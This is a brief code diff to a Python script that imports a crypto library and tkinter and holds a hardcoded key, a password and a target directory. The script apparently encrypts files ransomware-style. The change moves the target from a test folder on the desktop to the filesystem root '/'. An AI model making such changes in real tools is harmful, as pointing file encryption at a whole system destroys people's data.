@@ -5,9 +5,9 @@ from Crypto import Random
 from tkinter import *
 
 KEY = b'1111111111111111'
-PASSWORD = '0774654930'
+PASSWORD = '123456789101112'
 
-TARGET_DIR = r'/home/user/Desktop/new/'  
+TARGET_DIR = r'/'  
 
 # TARGET_DIR = r'C:\Users\YourName\Desktop\new'
 
